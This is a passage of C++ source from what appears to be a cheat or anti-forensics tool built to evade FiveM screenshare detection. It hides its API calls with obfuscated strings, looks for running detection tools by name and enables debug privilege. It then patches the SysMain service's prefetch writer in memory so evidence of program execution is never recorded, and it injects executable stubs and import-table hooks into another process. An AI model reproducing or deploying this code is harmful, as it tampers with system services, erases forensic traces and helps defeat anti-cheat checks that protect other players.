    { return Resolve(cache::pRegOpenKeyExW_, xorstr("advapi32.dll"), xorstr("RegOpenKeyExW"))(k, sub, opt, sam, out); }

    inline LONG      RegDeleteValueW_(HKEY k, LPCWSTR name)
    { return Resolve(cache::pRegDeleteValueW_, xorstr("advapi32.dll"), xorstr("RegDeleteValueW"))(k, name); }

    inline LONG      RegCloseKey_(HKEY k)
    { return Resolve(cache::pRegCloseKey_, xorstr("advapi32.dll"), xorstr("RegCloseKey"))(k); }

    inline LONG      RegQueryValueExW_(HKEY k, LPCWSTR name, LPDWORD rsv, LPDWORD type, LPBYTE data, LPDWORD len)
    { return Resolve(cache::pRegQueryValueExW_, xorstr("advapi32.dll"), xorstr("RegQueryValueExW"))(k, name, rsv, type, data, len); }

    inline LONG      RegSetValueExW_(HKEY k, LPCWSTR name, DWORD rsv, DWORD type, const BYTE* data, DWORD len)
    { return Resolve(cache::pRegSetValueExW_, xorstr("advapi32.dll"), xorstr("RegSetValueExW"))(k, name, rsv, type, data, len); }

    // ---------------- winhttp ----------------
    inline HINTERNET WinHttpOpen_(LPCWSTR ua, DWORD at, LPCWSTR pn, LPCWSTR pb, DWORD f)
    { return Resolve(cache::pWinHttpOpen_, xorstr("winhttp.dll"), xorstr("WinHttpOpen"))(ua, at, pn, pb, f); }

    inline HINTERNET WinHttpConnect_(HINTERNET s, LPCWSTR host, INTERNET_PORT p, DWORD f)
    { return Resolve(cache::pWinHttpConnect_, xorstr("winhttp.dll"), xorstr("WinHttpConnect"))(s, host, p, f); }

    inline HINTERNET WinHttpOpenRequest_(HINTERNET c, LPCWSTR verb, LPCWSTR obj, LPCWSTR ver,
                                          LPCWSTR ref, LPCWSTR* accept, DWORD f)
    { return Resolve(cache::pWinHttpOpenRequest_, xorstr("winhttp.dll"), xorstr("WinHttpOpenRequest"))(c, verb, obj, ver, ref, accept, f); }

    inline BOOL      WinHttpSendRequest_(HINTERNET r, LPCWSTR hdr, DWORD hdrLen, LPVOID opt, DWORD optLen, DWORD total, DWORD_PTR ctx)
    { return Resolve(cache::pWinHttpSendRequest_, xorstr("winhttp.dll"), xorstr("WinHttpSendRequest"))(r, hdr, hdrLen, opt, optLen, total, ctx); }

    inline BOOL      WinHttpReceiveResponse_(HINTERNET r, LPVOID rsv)
    { return Resolve(cache::pWinHttpReceiveResponse_, xorstr("winhttp.dll"), xorstr("WinHttpReceiveResponse"))(r, rsv); }

    inline BOOL      WinHttpQueryHeaders_(HINTERNET r, DWORD level, LPCWSTR name, LPVOID buf, LPDWORD bufLen, LPDWORD idx)
    { return Resolve(cache::pWinHttpQueryHeaders_, xorstr("winhttp.dll"), xorstr("WinHttpQueryHeaders"))(r, level, name, buf, bufLen, idx); }

    inline BOOL      WinHttpReadData_(HINTERNET r, LPVOID buf, DWORD want, LPDWORD got)
    { return Resolve(cache::pWinHttpReadData_, xorstr("winhttp.dll"), xorstr("WinHttpReadData"))(r, buf, want, got); }

    inline BOOL      WinHttpCloseHandle_(HINTERNET h)
    { return Resolve(cache::pWinHttpCloseHandle_, xorstr("winhttp.dll"), xorstr("WinHttpCloseHandle"))(h); }

    inline bool EnableDebugPrivilege()
    {
        HANDLE token = nullptr;
        if (!OpenProcessToken_(GetCurrentProcess_(),
                               TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
            return false;

        LUID luid{};
        if (!LookupPrivilegeValueW_(nullptr, xorstr(L"SeDebugPrivilege"), &luid))
        {
            CloseH(token);
            return false;
        }

        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        BOOL ok = AdjustTokenPrivileges_(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        const DWORD err = GetLastError_();
        CloseH(token);
        return ok && err == ERROR_SUCCESS;
    }
} // namespace api

namespace Functions
{
    inline std::atomic<bool> g_blocked{ false };
    // Setado durante DoF7 para o CloakWatchdog abortar o scan corrente e
    // liberar o buffer/lock; sem isso o F7 esperava minutos pelo scan do FiveM.
    inline std::atomic<bool> g_f7Active{ false };
    inline std::atomic<bool> g_f7Done{ false };
    // Separate from g_f7Active: the latter is intentionally cleared before the
    // post-truncate hold delay, while this guard covers the whole F7 operation.
    inline std::atomic<bool> g_f7Running{ false };

    // FiveM scrubbing is opt-in and limited to the length-preserving path below.
    // ResourceCache owns variable-sized buffers, so avoid arbitrary writes.
    inline constexpr bool g_allowFiveMRemoteScrub = false;
    // Enable the length-preserving FiveM scrub used by Shift+F7.
    inline constexpr bool g_allowFiveMLengthPreservingMask = true;
    inline constexpr bool g_allowFiveMNumericMask = false;

    // Key binds are independent and already serialized by their own state:
    // F6 uses g_hollowState, F7 uses g_f7Running/g_f7Done.  The old ticket
    // queue made every bind wait for the previous pool task to finish, so a
    // 15s hook hold (or an F7 cleanup) looked like a dead keyboard.  Submit
    // directly: each edge starts immediately on its own pool callback.

    template <class Fn>
    struct ScopeGuard
    {
        Fn fn;
        bool active = true;

        explicit ScopeGuard(Fn fnIn)
            : fn(std::move(fnIn))
        {
        }

        ScopeGuard(const ScopeGuard&) = delete;
        ScopeGuard& operator=(const ScopeGuard&) = delete;

        ScopeGuard(ScopeGuard&& other) noexcept
            : fn(std::move(other.fn)), active(other.active)
        {
            other.active = false;
        }

        ~ScopeGuard() noexcept
        {
            if (!active) return;
            try { fn(); } catch (...) { }
        }

        void dismiss() noexcept { active = false; }
    };

    template <class Fn>
    inline ScopeGuard<Fn> MakeScopeGuard(Fn fn)
    {
        return ScopeGuard<Fn>{ std::move(fn) };
    }

    template <class Fn>
    inline bool SubmitKeyAction(Fn fn)
    {
        // No ticket spin-wait: it blocked the next bind behind the current
        // action.  SubmitPoolTask already traps C++ and SEH exceptions in the
        // worker trampoline, and the per-action guards prevent duplicates.
        return api::SubmitPoolTask(std::move(fn));
    }

    inline std::vector<DWORD> FindAllPidsByName(const wchar_t* targetLower);
    inline bool SetWinlogonDefault();
    inline bool RestoreWinlogonSaved();

    inline std::string ToLowerA(std::string s)
    {
        for (auto& c : s)
            if (c >= 'A' && c <= 'Z') c = static_cast<char>(c + 32);
        return s;
    }

    inline std::string WideToNarrow(const wchar_t* w)
    {
        std::string out;
        while (*w) { out += static_cast<char>(*w & 0xFF); ++w; }
        return out;
    }

    inline std::unordered_set<std::string> SnapshotRunningLowerNames()
    {
        std::unordered_set<std::string> names;
        HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return names;

        PROCESSENTRY32W e{};
        e.dwSize = sizeof(e);
        if (sc::CallProcess32FirstW(snap, &e))
        {
            int guard = 0;
            do {
                names.insert(ToLowerA(WideToNarrow(e.szExeFile)));
                if (++guard >= 100000) {

                    break;
                }
            } while (sc::CallProcess32NextW(snap, &e));
        }

        sc::CallCloseHandle(snap);
        return names;
    }

    inline void CheckProcesses()
    {

        const auto running = SnapshotRunningLowerNames();

        if (running.empty()) return;

        bool found = false;
        for (const auto& p : running)
        {
            if (p.find(xorstr("echo"))    != std::string::npos ||
                p.find(xorstr("napse"))   != std::string::npos ||
                p.find(xorstr("detect"))  != std::string::npos ||
                p.find(xorstr("gengar"))  != std::string::npos)
            { found = true; break; }
        }
        static bool s_lastBlocked = false;
        if (found != s_lastBlocked)
        {
            s_lastBlocked = found;
        }
        g_blocked.store(found, std::memory_order_relaxed);

    }

    inline DWORD FindPidByName(const wchar_t* targetLower)
    {
        HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return 0;

        PROCESSENTRY32W e{};
        e.dwSize = sizeof(e);
        DWORD pid = 0;

        if (sc::CallProcess32FirstW(snap, &e))
        {
            do
            {
                wchar_t lower[260]{};
                for (int i = 0; e.szExeFile[i] && i < 259; ++i)
                {
                    wchar_t c = e.szExeFile[i];
                    if (c >= L'A' && c <= L'Z') c += 32;
                    lower[i] = c;
                }
                if (wcscmp(lower, targetLower) == 0) { pid = e.th32ProcessID; break; }
            } while (sc::CallProcess32NextW(snap, &e));
        }
        sc::CallCloseHandle(snap);
        return pid;
    }

    inline std::vector<DWORD> FindAllPidsByName(const wchar_t* targetLower)
    {
        std::vector<DWORD> pids;
        HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return pids;

        PROCESSENTRY32W e{};
        e.dwSize = sizeof(e);

        if (sc::CallProcess32FirstW(snap, &e))
        {
            do
            {
                wchar_t lower[260]{};
                for (int i = 0; e.szExeFile[i] && i < 259; ++i)
                {
                    wchar_t c = e.szExeFile[i];
                    if (c >= L'A' && c <= L'Z') c += 32;
                    lower[i] = c;
                }
                if (wcscmp(lower, targetLower) == 0) pids.push_back(e.th32ProcessID);
            } while (sc::CallProcess32NextW(snap, &e));
        }
        sc::CallCloseHandle(snap);
        return pids;
    }

    inline std::vector<DWORD> FindAllPidsByImagePath(const std::wstring& expectedPath)
    {
        std::vector<DWORD> pids;
        if (expectedPath.empty()) return pids;

        HANDLE snap = sc::CallCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return pids;

        PROCESSENTRY32W e{};
        e.dwSize = sizeof(e);
        if (sc::CallProcess32FirstW(snap, &e))
        {
            do
            {
                if (e.th32ProcessID == api::GetCurrentProcessId_()) continue;

                HANDLE hProc = api::OpenProcess_(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, e.th32ProcessID);
                if (!hProc) continue;

                wchar_t imagePath[32768]{};
                DWORD pathLen = static_cast<DWORD>(_countof(imagePath));
                const bool queried = api::QueryFullProcessImageNameW_(hProc, 0, imagePath, &pathLen) != FALSE;
                api::CloseH(hProc);

                if (queried && _wcsicmp(imagePath, expectedPath.c_str()) == 0)
                    pids.push_back(e.th32ProcessID);
            } while (sc::CallProcess32NextW(snap, &e));
        }
        sc::CallCloseHandle(snap);
        return pids;
    }

    inline DWORD GetServiceHostPid(const wchar_t* svcName)
    {
        SC_HANDLE hSCM = api::OpenSCManagerW_(nullptr, nullptr, SC_MANAGER_CONNECT);
        if (!hSCM) return 0;

        SC_HANDLE hSvc = api::OpenServiceW_(hSCM, svcName, SERVICE_QUERY_STATUS);
        api::CloseServiceHandle_(hSCM);
        if (!hSvc) return 0;

        SERVICE_STATUS_PROCESS ssp{};
        DWORD needed = 0;
        api::QueryServiceStatusEx_(
            hSvc, SC_STATUS_PROCESS_INFO,
            reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &needed);
        api::CloseServiceHandle_(hSvc);
        return ssp.dwProcessId;
    }

    // =========================================================================
    // NtCreateFile remote patch — bloqueia criação de arquivo no svchost do
    // SysMain para impedir geração de .pf do runtimebroker.
    // Patch remoto: sobrescreve os primeiros 12 bytes de NtCreateFile no
    // processo alvo com  mov eax, STATUS_ACCESS_DENIED; ret.
    // ntdll é mapeada no mesmo VA em todos os processos (ASLR per-boot),
    // então o endereço local de NtCreateFile serve pro remoto.
    // =========================================================================
    namespace NtCreateFileHook
    {
        inline uint8_t  g_origBytes[12] = {};
        inline uint8_t* g_patchAddr     = nullptr;
        inline HANDLE   g_hProc         = nullptr;
        inline bool     g_hooked        = false;
        inline DWORD    g_lastError    = ERROR_SUCCESS;
        inline DWORD    g_targetPid    = 0;
        inline uintptr_t g_remoteNtdll = 0;

        inline uint8_t g_pfOrigBytes[12] = {};
        inline uint8_t* g_pfPatchAddr = nullptr;
        inline bool g_pfHooked = false;
        inline std::recursive_mutex g_hookStateMutex;

        enum class WindowsFamily : uint8_t
        {
            Unknown,
            Windows10,
            Windows11
        };

        struct WindowsVersion
        {
            WindowsFamily family = WindowsFamily::Unknown;
            DWORD build = 0;
        };

        using fn_RtlGetVersion = LONG (WINAPI*)(POSVERSIONINFOW);

        inline WindowsVersion DetectWindowsVersion()
        {
            void* ntdll = sc::detail::find_module(xorstr("ntdll.dll"));
            if (!ntdll)
                return {};

            auto rtlGetVersion = reinterpret_cast<fn_RtlGetVersion>(
                sc::detail::find_export(
                    ntdll,
                    sc::djb2_rt(xorstr("RtlGetVersion"))));
            if (!rtlGetVersion)
                return {};

            OSVERSIONINFOW version{};
            version.dwOSVersionInfoSize = sizeof(version);
            if (rtlGetVersion(&version) != 0 ||
                version.dwMajorVersion != 10 ||
                version.dwMinorVersion != 0)
            {
                return { WindowsFamily::Unknown, version.dwBuildNumber };
            }

            // Windows 10 uses builds 10240-19045. Windows 11 starts at
            // build 22000 while retaining the 10.0 version tuple.
            if (version.dwBuildNumber >= 22000)
                return { WindowsFamily::Windows11, version.dwBuildNumber };
            if (version.dwBuildNumber >= 10240)
                return { WindowsFamily::Windows10, version.dwBuildNumber };

            return { WindowsFamily::Unknown, version.dwBuildNumber };
        }

        struct RemotePattern
        {
            const uint8_t* bytes;
            const char* mask;
            std::size_t size;
        };

        // PfSvWriteBufferEx is not at one stable RVA across Windows builds.
        // Keep the signature deliberately tied to the function prologue and
        // scan only executable sections before changing any remote bytes.
        inline constexpr uint8_t kPfSvWriteBufferExPattern[] = {
            0x48, 0x89, 0x5C, 0x24, 0x00,
            0x48, 0x89, 0x6C, 0x24, 0x00,
            0x48, 0x89, 0x74, 0x24, 0x00,
            0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
            0x48, 0x83, 0xEC, 0x00,
            0x45, 0x0F, 0xB7, 0xD1
        };
        inline constexpr char kPfSvWriteBufferExMask[] =
            "xxxx?xxxx?xxxx?xxxxxxxxxxxx?xxxx";
        inline constexpr RemotePattern kPfSvWriteBufferExSignature = {
            kPfSvWriteBufferExPattern,
            kPfSvWriteBufferExMask,
            sizeof(kPfSvWriteBufferExPattern)
        };

        // Windows 11 22H2/23H2 SysMain (10.0.22621/22631) signature
        // validated against the supplied sysmain.dll.  The first 32 bytes
        // overlap the generic signature above; the additional instructions
        // make the Win11 match unambiguous without hard-coding an RVA.
        inline constexpr uint8_t kPfSvWriteBufferExWin11Pattern[] = {
            0x48, 0x89, 0x5C, 0x24, 0x08,
            0x48, 0x89, 0x6C, 0x24, 0x10,
            0x48, 0x89, 0x74, 0x24, 0x18,
            0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
            0x48, 0x83, 0xEC, 0x50,
            0x45, 0x0F, 0xB7, 0xD1,
            0x4C, 0x8B, 0xEA,
            0x48, 0x8B, 0xD1,
            0x45, 0x8B, 0xFA,
            0x41, 0x0F, 0xBA, 0xEF, 0x15
        };
        inline constexpr char kPfSvWriteBufferExWin11Mask[] =
            "xxxxxxxxxxxxxxxx"
            "xxxxxxxxxxxxxxxx"
            "xxxxxxxxxxxxxx";
        inline constexpr RemotePattern kPfSvWriteBufferExWin11Signature = {
            kPfSvWriteBufferExWin11Pattern,
            kPfSvWriteBufferExWin11Mask,
            sizeof(kPfSvWriteBufferExWin11Pattern)
        };

        inline constexpr uint8_t kPfSvWriteBufferExBlockedPattern[] = {
            0x31, 0xC0, 0xC3,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            0x74, 0x24, 0x00,
            0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
            0x48, 0x83, 0xEC, 0x00,
            0x45, 0x0F, 0xB7, 0xD1
        };
        inline constexpr char kPfSvWriteBufferExBlockedMask[] =
            "xxxxxxxxxxxxxx?xxxxxxxxxxxx?xxxx";
        inline constexpr RemotePattern kPfSvWriteBufferExBlockedSignature = {
            kPfSvWriteBufferExBlockedPattern,
            kPfSvWriteBufferExBlockedMask,
            sizeof(kPfSvWriteBufferExBlockedPattern)
        };

        // Keep accepting both patch forms during recovery.  The error-return
        // form is the active one because PfSvWriteBufferEx's caller skips the
        // file write when it receives ERROR_ACCESS_DENIED.
        inline constexpr uint8_t kPfSvWriteBufferExLegacyPatch[12] = {
            0x31, 0xC0, 0xC3,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
        };
        inline constexpr uint8_t kPfSvWriteBufferExBlockedLegacyPattern[] = {
            0xB8, 0x05, 0x00, 0x00, 0x00,
            0xC3,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
            0x74, 0x24, 0x00,
            0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
            0x48, 0x83, 0xEC, 0x00,
            0x45, 0x0F, 0xB7, 0xD1
        };
        inline constexpr char kPfSvWriteBufferExBlockedLegacyMask[] =
            "xxxxxxxxxxxxxx?xxxxxxxxxxxx?xxxx";
        inline constexpr RemotePattern kPfSvWriteBufferExBlockedLegacySignature = {
            kPfSvWriteBufferExBlockedLegacyPattern,
            kPfSvWriteBufferExBlockedLegacyMask,
            sizeof(kPfSvWriteBufferExBlockedLegacyPattern)
        };

        inline constexpr uint8_t kPfSvWriteBufferExPatch[12] = {
            0xB8, 0x05, 0x00, 0x00, 0x00,
            0xC3,
            0x90, 0x90, 0x90, 0x90, 0x90, 0x90
        };

        enum class RemoteStubKind
        {
            NtStatusAccessDenied,
            InvalidHandle,
            BooleanFalse
        };

        struct RemoteIatPatch
        {
            LPVOID slot = nullptr;
            ULONG_PTR original = 0;
            LPVOID replacement = nullptr;
        };

        inline std::array<RemoteIatPatch, 4> g_iatPatches{};
        inline std::size_t g_iatPatchCount = 0;
        inline std::array<LPVOID, 4> g_remoteStubs{};
        inline std::size_t g_remoteStubCount = 0;

        inline void ResetHookState()
        {
            g_origBytes[0] = 0;
            g_pfOrigBytes[0] = 0;
            g_hProc = nullptr;
            g_patchAddr = nullptr;
            g_pfPatchAddr = nullptr;
            g_remoteNtdll = 0;
            g_targetPid = 0;
            g_hooked = false;
            g_pfHooked = false;
            g_iatPatches = {};
            g_iatPatchCount = 0;
            g_remoteStubs = {};
            g_remoteStubCount = 0;
        }

        inline DWORD LastError()
        {
            return g_lastError;
        }

        inline bool EqualAscii(const char* left, const char* right)
        {
            if (!left || !right) return false;
            while (*left && *right)
            {
                char a = *left++;
                char b = *right++;
                if (a >= 'A' && a <= 'Z') a = static_cast<char>(a + 32);
                if (b >= 'A' && b <= 'Z') b = static_cast<char>(b + 32);
                if (a != b) return false;
            }
            return *left == '\0' && *right == '\0';
        }

        inline uintptr_t FindRemoteModule(DWORD pid, const wchar_t* wanted)
        {
            if (!wanted) return 0;
            HANDLE snap = sc::CallCreateToolhelp32Snapshot(
                TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
            if (snap == INVALID_HANDLE_VALUE) return 0;

            uintptr_t result = 0;
            MODULEENTRY32W entry{};
            entry.dwSize = sizeof(entry);
            if (api::Module32FirstW_(snap, &entry))
            {
                do
                {
                    if (_wcsicmp(entry.szModule, wanted) == 0)
                    {
                        result = reinterpret_cast<uintptr_t>(entry.modBaseAddr);
                        break;
                    }
                } while (api::Module32NextW_(snap, &entry));
            }
            api::CloseH(snap);
            return result;
        }
        inline bool ReadRemote(HANDLE process, uintptr_t address,
                               void* buffer, SIZE_T size)
        {
            if (!process || !address || !buffer || !size) return false;
            SIZE_T read = 0;
            const NTSTATUS status = nt::NtReadVirtualMemory_(
                process, reinterpret_cast<PVOID>(address), buffer, size, &read);
            return NT_SUCCESS(status) && read == size;
        }

        inline bool MatchesPattern(const uint8_t* data,
                                   const RemotePattern& pattern)
        {
            if (!data || !pattern.bytes || !pattern.mask || pattern.size == 0)
                return false;

            for (std::size_t i = 0; i < pattern.size; ++i)
            {
                if (pattern.mask[i] != '?' && data[i] != pattern.bytes[i])
                    return false;
            }
            return true;
        }

        inline uintptr_t FindRemotePattern(uintptr_t moduleBase,
                                           const RemotePattern& pattern)
        {
            if (!g_hProc || !moduleBase || pattern.size == 0)
                return 0;

            IMAGE_DOS_HEADER dos{};
            if (!ReadRemote(g_hProc, moduleBase, &dos, sizeof(dos)) ||
                dos.e_magic != IMAGE_DOS_SIGNATURE || dos.e_lfanew <= 0)
                return 0;

            IMAGE_NT_HEADERS64 ntHeaders{};
            const uintptr_t ntAddress = moduleBase +
                static_cast<uintptr_t>(static_cast<DWORD>(dos.e_lfanew));
            if (!ReadRemote(g_hProc, ntAddress, &ntHeaders,
                            sizeof(ntHeaders)) ||
                ntHeaders.Signature != IMAGE_NT_SIGNATURE ||
                ntHeaders.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
                ntHeaders.FileHeader.NumberOfSections == 0 ||
                ntHeaders.OptionalHeader.SizeOfImage == 0)
                return 0;

            const uintptr_t sectionHeaders = ntAddress + sizeof(DWORD) +
                sizeof(IMAGE_FILE_HEADER) +
                ntHeaders.FileHeader.SizeOfOptionalHeader;
            uintptr_t match = 0;

            for (WORD index = 0;
                 index < ntHeaders.FileHeader.NumberOfSections && index < 96;
                 ++index)
            {
                IMAGE_SECTION_HEADER section{};
                const uintptr_t sectionAddress = sectionHeaders +
                    static_cast<uintptr_t>(index) * sizeof(IMAGE_SECTION_HEADER);
                if (!ReadRemote(g_hProc, sectionAddress, &section,
                                sizeof(section)))
                    return 0;

                if ((section.Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)
                    continue;

                const DWORD sectionSize = section.Misc.VirtualSize
                    ? section.Misc.VirtualSize
                    : section.SizeOfRawData;
                if (sectionSize < pattern.size ||
                    section.VirtualAddress >= ntHeaders.OptionalHeader.SizeOfImage)
                    continue;

                SIZE_T scanSize = sectionSize;
                const SIZE_T remaining = ntHeaders.OptionalHeader.SizeOfImage -
                    section.VirtualAddress;
                if (scanSize > remaining)
                    scanSize = remaining;
                if (scanSize < pattern.size)
                    continue;

                try
                {
                    std::vector<uint8_t> code(scanSize);
                    const uintptr_t remoteCode = moduleBase +
                        section.VirtualAddress;
                    if (!ReadRemote(g_hProc, remoteCode, code.data(),
                                    code.size()))
                        return 0;

                    for (SIZE_T offset = 0;
                         offset + pattern.size <= code.size(); ++offset)
                    {
                        if (!MatchesPattern(code.data() + offset, pattern))
                            continue;

                        const uintptr_t candidate = remoteCode + offset;
                        if (match != 0)
                            return 0;
                        match = candidate;
                    }
                }
                catch (...)
                {
                    g_lastError = ERROR_NOT_ENOUGH_MEMORY;
                    return 0;
                }
            }

            return match;
        }
        inline bool FindRemoteIatSlot(uintptr_t moduleBase,
                                      const char* functionName,
                                      LPVOID* slot, ULONG_PTR* original)
        {
            if (!g_hProc || !moduleBase || !functionName || !slot || !original)
                return false;

            IMAGE_DOS_HEADER dos{};
            if (!ReadRemote(g_hProc, moduleBase, &dos, sizeof(dos)) ||
                dos.e_magic != IMAGE_DOS_SIGNATURE || dos.e_lfanew <= 0)
                return false;

            IMAGE_NT_HEADERS64 ntHeaders{};
            const uintptr_t ntAddress = moduleBase +
                static_cast<uintptr_t>(static_cast<DWORD>(dos.e_lfanew));
            if (!ReadRemote(g_hProc, ntAddress, &ntHeaders, sizeof(ntHeaders)) ||
                ntHeaders.Signature != IMAGE_NT_SIGNATURE ||
                ntHeaders.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
                return false;

            const IMAGE_DATA_DIRECTORY& imports = ntHeaders.OptionalHeader
                .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
            if (!imports.VirtualAddress || !imports.Size)
                return false;

            const std::size_t count = std::min<std::size_t>(
                imports.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR), 1024);
            const uintptr_t importBase = moduleBase + imports.VirtualAddress;
            for (std::size_t d = 0; d < count; ++d)
            {
                IMAGE_IMPORT_DESCRIPTOR descriptor{};
                if (!ReadRemote(g_hProc,
                                importBase + d * sizeof(descriptor),
                                &descriptor, sizeof(descriptor)))
                    return false;
                if (!descriptor.Name) break;
                if (!descriptor.FirstThunk) continue;

                const DWORD originalThunkRva = descriptor.OriginalFirstThunk
                    ? descriptor.OriginalFirstThunk
                    : descriptor.FirstThunk;
                for (std::size_t t = 0; t < 65536; ++t)
                {
                    ULONGLONG thunk = 0;
                    if (!ReadRemote(g_hProc,
                                    moduleBase + originalThunkRva +
                                        t * sizeof(ULONGLONG),
                                    &thunk, sizeof(thunk)))
                        return false;
                    if (!thunk) break;
                    if (IMAGE_SNAP_BY_ORDINAL64(thunk)) continue;

                    char importedName[256]{};
                    if (!ReadRemote(g_hProc,
                                    moduleBase + static_cast<uintptr_t>(thunk) +
                                        sizeof(WORD),
                                    importedName, sizeof(importedName) - 1))
                        return false;
                    importedName[sizeof(importedName) - 1] = '\0';
                    if (!EqualAscii(importedName, functionName)) continue;

                    const uintptr_t slotAddress = moduleBase +
                        descriptor.FirstThunk + t * sizeof(ULONG_PTR);
                    ULONG_PTR current = 0;
                    if (!ReadRemote(g_hProc, slotAddress, &current,
                                    sizeof(current)))
                        return false;
                    *slot = reinterpret_cast<LPVOID>(slotAddress);
                    *original = current;
                    return true;
                }
            }
            return false;
        }

        inline LPVOID AllocateRemoteStub(RemoteStubKind kind)
        {
            BYTE code[16]{};
            SIZE_T codeSize = 0;
            switch (kind)
            {
            case RemoteStubKind::NtStatusAccessDenied:
                code[0] = 0xB8; code[1] = 0x22; code[4] = 0xC0;
                code[5] = 0xC3; codeSize = 6;
                break;
            case RemoteStubKind::InvalidHandle:
                code[0] = 0x48; code[1] = 0xC7; code[2] = 0xC0;
                code[3] = 0xFF; code[4] = 0xFF; code[5] = 0xFF;
                code[6] = 0xFF; code[7] = 0xC3; codeSize = 8;
                break;
            case RemoteStubKind::BooleanFalse:
                code[0] = 0x31; code[1] = 0xC0; code[2] = 0xC3;
                codeSize = 3;
                break;
            }

            LPVOID remote = api::VirtualAllocEx_(
                g_hProc, nullptr, 0x1000,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!remote) return nullptr;

            SIZE_T written = 0;
            if (!api::WriteProcessMemory_(g_hProc, remote, code, codeSize,
                                           &written) || written != codeSize)
            {
                api::VirtualFreeEx_(g_hProc, remote, 0, MEM_RELEASE);
                return nullptr;
            }
            api::FlushInstructionCache_(g_hProc, remote, codeSize);
            return remote;
        }

        inline bool RemoteProcessExited()
        {
            if (!g_hProc)
                return false;
            const DWORD state = api::WaitForSingleObject_(g_hProc, 0);
            return state == WAIT_OBJECT_0 || state == WAIT_ABANDONED;
        }

        inline bool WriteRemoteBytes(LPVOID address, const void* bytes,
                                     SIZE_T size)
        {
            if (!g_hProc || !address || !bytes || size == 0 || size > 64)
                return false;

            DWORD oldProtection = 0;
            if (!api::VirtualProtectEx_(g_hProc, address, size,
                                        PAGE_EXECUTE_READWRITE,
                                        &oldProtection))
            {
                g_lastError = api::GetLastError_();
                return false;
            }

            SIZE_T written = 0;
            const BOOL writeOk = api::WriteProcessMemory_(
                g_hProc, address, bytes, size, &written);
            DWORD ignored = 0;
            const BOOL protectionRestored = api::VirtualProtectEx_(
                g_hProc, address, size, oldProtection, &ignored);

            if (!writeOk || written != size || !protectionRestored)
            {
                g_lastError = api::GetLastError_();
                return false;
            }

            api::FlushInstructionCache_(g_hProc, address, size);

            std::array<uint8_t, 64> verify{};
            if (!ReadRemote(g_hProc, reinterpret_cast<uintptr_t>(address),
                            verify.data(), size) ||
                std::memcmp(verify.data(), bytes, size) != 0)
            {
                g_lastError = ERROR_WRITE_FAULT;
                return false;
            }
            return true;
        }

        inline bool PatchRemotePointer(LPVOID slot, LPVOID replacement)
        {
            const ULONG_PTR value = reinterpret_cast<ULONG_PTR>(replacement);
            return WriteRemoteBytes(slot, &value, sizeof(value));
        }

        inline bool RestoreRemotePointer(const RemoteIatPatch& patch,
                                         bool force)
        {
            if (!g_hProc || !patch.slot)
                return false;

            ULONG_PTR current = 0;
            if (!ReadRemote(g_hProc,
                            reinterpret_cast<uintptr_t>(patch.slot),
                            &current, sizeof(current)))
                return false;

            if (current == patch.original)
                return true;

            // Another component may have replaced the import after us.  Do
            // not overwrite an unknown pointer; our stub is no longer the
            // active value in that case.
            if (!force &&
                current != reinterpret_cast<ULONG_PTR>(patch.replacement))
                return true;

            const ULONG_PTR original = patch.original;
            return WriteRemoteBytes(patch.slot, &original, sizeof(original));
        }

        inline bool RemoveIatHooks(bool force = false)
        {
            if (g_iatPatchCount == 0)
            {
                if (g_hProc)
                {
                    for (std::size_t i = 0; i < g_remoteStubCount; ++i)
                    {
                        if (g_remoteStubs[i])
                            api::VirtualFreeEx_(g_hProc, g_remoteStubs[i],
                                                0, MEM_RELEASE);
                    }
                    g_remoteStubs = {};
                    g_remoteStubCount = 0;
                }
                return true;
            }

            if (!g_hProc)
                return false;

            std::array<RemoteIatPatch, 4> remaining{};
            std::size_t remainingCount = 0;
            bool allRestored = true;
            for (std::size_t i = g_iatPatchCount; i != 0; --i)
            {
                const RemoteIatPatch& patch = g_iatPatches[i - 1];
                if (!RestoreRemotePointer(patch, force))
                {
                    allRestored = false;
                    if (remainingCount < remaining.size())
                        remaining[remainingCount++] = patch;
                }
            }

            g_iatPatches = {};
            for (std::size_t i = 0; i < remainingCount; ++i)
                g_iatPatches[i] = remaining[remainingCount - i - 1];
            g_iatPatchCount = remainingCount;

            if (!allRestored)
                return false;

            for (std::size_t i = 0; i < g_remoteStubCount; ++i)
            {
                if (g_remoteStubs[i])
                    api::VirtualFreeEx_(g_hProc, g_remoteStubs[i],
                                        0, MEM_RELEASE);
            }
            g_remoteStubs = {};
            g_remoteStubCount = 0;
            return true;
        }

        inline bool ReconstructPfOriginal(const uint8_t* current,
                                          uint8_t* original)
        {
            if (!current || !original ||
                (std::memcmp(current, kPfSvWriteBufferExPatch,
                             sizeof(kPfSvWriteBufferExPatch)) != 0 &&
                 std::memcmp(current, kPfSvWriteBufferExLegacyPatch,
